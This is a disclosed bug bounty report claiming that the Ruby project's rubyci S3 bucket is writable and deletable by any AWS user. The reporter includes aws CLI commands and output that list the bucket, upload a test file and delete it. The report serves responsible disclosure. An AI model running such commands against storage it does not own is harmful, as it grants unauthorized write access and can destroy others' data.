# Open S3 Bucket WriteAble To Any Aws User

## Report Details
- **Report ID**: 209223
- **URL**: https://hackerone.com/reports/209223
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-02-27T05:03:26.071Z
- **Disclosed**: 2017-03-29T23:22:24.322Z

## Reporter
- **Username**: injector404
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Hi All,
I know that http://rubyci.s3.amazonaws.com is used for file uploads on reports and so when i open your s3 bucket i able see all of your public/private files i already see you fix this vulnerability but it not completely fixed
 
	root@injector:~# aws s3 ls s3://rubyci
	                           PRE aix71_ppc/
	                           PRE amazon/
	                           PRE arch/
	                           PRE archive/
	                           PRE armv8b/
	                           PRE c64b/
	                           PRE centos5-32/
	                           PRE centos5-64/
	                           PRE centos7/
	                           PRE debian/
	                           PRE debian7/
	                           PRE debian8/
	                           PRE f19p8/
	                           PRE fedora20/
	                           PRE fedora21/
	                           PRE fedora22/
	                           PRE fedora23/
	                           PRE fedora24/
	                           PRE fedora25/
	                           PRE freebsd10-zfs/
	                           PRE freebsd11zfs/
	                           PRE freebsd82-32/
	                           PRE freebsd82-64/
	                           PRE funtoo/
	                           PRE gentoo/
	                           PRE icc-x64/
	                           PRE opensuse13/
	                           PRE opensuseleap/
	                           PRE osx1010/
	                           PRE osx1011/
	                           PRE rhel_zlinux/
	                           PRE scw-9d6766/
	                           PRE tk2-243-31075/
	                           PRE ubuntu/
	                           PRE ubuntu1004-32/
	                           PRE ubuntu1004-64/
	                           PRE ubuntu1404/
	                           PRE ubuntu1410/
	                           PRE ubuntu1510/
	                           PRE ubuntu1604/
	                           PRE unstable10s/
	                           PRE unstable10x/
	                           PRE unstable11s/
	                           PRE unstable11x/
	2017-02-17 13:03:14        112 test.html
	2017-02-27 09:52:15         20 test.txt

any one who have aws s3 cli can write in your bucket because your bucket writable through aws cli
when i try to move and delete any file on your bucket i got this
###MOVED
	root@injector:~# aws s3 mv test.txt s3://rubyci
	move: ./test.txt to s3://rubyci/test.txt 
###DELETED
	root@injector:~# aws s3 rm s3://rubyci/test.txt
	delete: s3://rubyci/test.txt

any one using aws cli can move and delete any file from your bucket
also check the attached picture and feel free to contact if you need any additional info

Best Regard
Saad Ahmed

## Attachments
- DELETE.png
- MOVE.png
- open_Bucket.png
- LIST_DIR.png
